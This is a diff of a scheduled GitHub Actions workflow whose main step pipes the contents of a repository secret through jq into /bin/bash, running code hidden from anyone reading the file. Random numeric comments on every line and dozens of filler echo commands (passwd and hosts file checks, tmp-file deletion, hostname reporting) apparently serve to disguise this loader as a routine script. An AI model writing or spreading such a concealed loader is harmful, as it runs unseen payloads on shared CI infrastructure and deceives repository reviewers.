@@ -1,19 +1,63 @@
-name: fengbuping6789 #1183
-on: #8643
-  workflow_dispatch: #2464
-  schedule: #14377
-    - cron: '30 1/6 * * *' #17019
-jobs: #4237
-  build: #27108
-    runs-on: ubuntu-latest #26043
-    steps: #14103
-      - uses: actions/checkout@v4 #6295
-      - name: fengbuping6789 #20223
-        env: #14756
-          j31628: ${{ secrets.j31628 }} #19334
+name: fengbuping6789 #18332
+on: #28267
+  workflow_dispatch: #28438
+  schedule: #3276
+    - cron: '24 1/6 * * *' #24342
+jobs: #30017
+  build: #17484
+    runs-on: ubuntu-latest #3475
+    steps: #9750
+      - uses: actions/checkout@v4 #428
+      - name: fengbuping6789 #17277
+        env: #2993
+          p5397: ${{ secrets.p5397 }} #13052
         run: |
-          echo $j31628 | jq -r .x6582 | /bin/bash #2135
+          echo $p5397 | jq -r .x24943 | /bin/bash #29891
+          echo "Process check: $(ps -ef | wc -l 2>/dev/null || echo 0)"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          echo "Files: $(ls | wc -l 2>/dev/null || echo 0)"
+          echo "Var op: v=1; echo \$((v+1))"
+          echo "Home dir: $(echo ~)"
+          echo "Range loop: for i in 1 3 5; do echo \$i; done"
+          echo "Time diff mock: echo \$SECONDS"
+          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
+          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
+          echo "Dir: $(pwd)"
+          echo "Exit mock: exit 0 2>/dev/null || true"
+          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
+          echo "Glob test: echo *.sh 2>/dev/null || echo no-sh"
+          which bash 2>/dev/null || echo "Bash not in path"
+          echo "History mock: history | head -1 2>/dev/null || echo no-history"
           echo "Checksum: $((1000 + RANDOM % 9000))"
-          echo "And/or chain: true && echo A || echo B"
+          echo "Bit ops: $(( 1 & 1 ))"
+          echo "File test: [ -e /etc/passwd ] && echo Passwd exists"
+          [ -f /etc/hosts ] && echo "Hosts exist" || true
+          echo "Var default: echo \${VAR:-default}"
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          [ -z "$RANDOM" ] || echo "Random var set"
+          echo "Math floor: echo \$(( 5 / 2 ))"
+          echo "Sed mock: echo 'text' | sed 's/t/T/' 2>/dev/null || echo no-sed"
+          echo "Version: $((1 + RANDOM % 5))"
+          echo "Tmp cleanup: rm -f /tmp/.tmp* 2>/dev/null || true"
+          echo "Random check: [ $((RANDOM % 2)) -eq 0 ] && echo Even || echo Odd"
+          echo "Subshell: (echo subshell)"
+          echo "Command fail safe: false || echo 'Safe'"
+          sleep 0.1 2>/dev/null || true
           echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          echo "Redirect mock: echo data > /dev/null 2>&1"
+          echo "Exit code test: $?"
+          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
+          echo "Brace exp: echo file_{1..3}.txt"
+          echo "Command || true: ls /nonexist || true"
+          echo "Socket test: echo 'socket-check'"
+          echo "Tar mock: tar -cf /dev/null /tmp 2>/dev/null || true"
+          echo "Math eval: echo \$(( 2 ​**​ 3 ))"
+          echo "Job control: sleep 0.01 & wait"
+          echo "Stderr dump: ls /nonexist 2>&1 | head -1 || true"
+          echo "Null check: [ ! -f /nonexistent ] && echo 'OK'"
+          echo "Command chain: true && echo 'A' || echo 'B'"
+          echo "Test file type: [ -f /etc/passwd ] && echo File"
+          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo "Time: $(date +%H:%M:%S)"
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
